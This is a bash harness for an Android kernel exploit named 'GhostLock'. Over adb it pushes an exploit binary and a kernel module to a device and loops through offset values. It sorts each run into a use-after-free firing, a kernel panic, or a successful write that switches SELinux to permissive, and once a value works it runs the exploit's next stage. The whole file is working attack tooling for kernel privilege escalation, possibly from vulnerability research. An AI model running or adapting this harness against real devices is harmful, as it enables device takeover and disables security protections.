#!/bin/bash
# GhostLock shift scan: for each GHOSTLOCK_SHIFT value, boot-wait, stage, run
# one W1 attempt, and classify the outcome:
#   "post-select ... ret=N" (N>0)  => UAF fired
#   "SELinux permissive"           => write landed (done!)
#   device DOWN                    => panic (value rejected)
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/env.sh"
require_dev || exit 1

stage() {
  for i in $(seq 1 60); do
    st=$(adb -s $DEV shell 'echo ok' 2>/dev/null | tr -d '\r'); [ "$st" = "ok" ] && break; sleep 3
  done
  for i in $(seq 1 40); do
    bc=$(adb -s $DEV shell 'getprop sys.boot_completed' 2>/dev/null | tr -d '\r'); [ "$bc" = "1" ] && break; sleep 3
  done
  sleep 5
  adb -s $DEV push "$BIN" /data/local/tmp/ghostlock >/dev/null 2>&1
  adb -s $DEV push "$KO" /data/local/tmp/kernelpatch.ko >/dev/null 2>&1
  adb -s $DEV shell 'chmod 755 /data/local/tmp/ghostlock' 2>/dev/null
}

for s in -4 -3 1 2 3 4; do
  echo "=== shift $s start $(date +%H:%M:%S) ==="
  stage
  timeout 90 adb -s $DEV shell "cd /data/local/tmp && GHOSTLOCK_SHIFT=$s GHOSTLOCK_W1_ATTEMPTS=1 ./ghostlock" > "$LOGDIR/gl_scan_${s}.log" 2>&1
  echo "ADB_EXIT=$?" >> "$LOGDIR/gl_scan_${s}.log"
  ret=$(grep -o "post-select compact=1 +[0-9]*ms ret=[0-9]*" "$LOGDIR/gl_scan_${s}.log" | tail -1)
  u=$(adb -s $DEV shell 'cat /proc/uptime' 2>/dev/null | cut -d' ' -f1)
  ok=$(grep -c "SELinux permissive" "$LOGDIR/gl_scan_${s}.log")
  echo "shift $s: ${ret:-no-post-select} uptime=${u:-DOWN} permissive=$ok"
  if [ "$ok" -ge 1 ]; then
    echo "=== SHIFT $s LANDED THE WRITE ==="
    # let the exploit continue to W2 with the winning shift
    timeout 200 adb -s $DEV shell "cd /data/local/tmp && GHOSTLOCK_SHIFT=$s ./ghostlock" > "$LOGDIR/gl_scan_${s}_full.log" 2>&1
    break
  fi
  sleep 3
done
echo "=== shift scan done $(date +%H:%M:%S) ==="
